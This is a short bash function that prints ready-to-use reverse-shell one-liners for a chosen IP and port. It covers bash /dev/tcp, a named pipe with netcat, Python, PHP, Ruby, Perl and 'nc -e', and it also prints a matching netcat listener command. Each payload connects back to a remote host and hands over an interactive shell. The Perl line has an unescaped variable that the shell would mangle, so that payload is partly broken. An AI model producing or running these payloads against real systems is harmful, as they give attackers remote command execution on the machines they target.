function reverse() {
  ip=$1
  port=$2

  if [ "${ip}" = "" ];then
    ip="192.0.2.0"
  fi

  if [ "${port}" = "" ];then
    port="4444"
  fi

  # receive
  echo "# receive"
  echo "nc -nlvp ${port}"
  echo ""

  #bash
  echo "# bash"
  echo "bash -i >& /dev/tcp/${ip}/${port} 0>&1"
  echo ""

  # named pipe
  echo "# named pipe"
  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f"
  echo ""

  # Python
  echo "# Python"
  echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ip}',${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
  echo ""
  
  # PHP
  echo "# PHP"
  echo "php -r '\$sock=fsockopen(\"${ip}\",${port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
  echo ""

  # Ruby
  echo "# Ruby"
  echo "ruby -rsocket -e'f=TCPSocket.open(\"${ip}\",${port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
  echo ""

  # Perl
  echo "# Perl"
  echo "perl -e 'use Socket;$i=\"${ip}\";\$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
  echo ""

  # netcat
  echo "# netcat"
  echo "nc -e /bin/sh ${ip} ${port}"
  echo ""

}
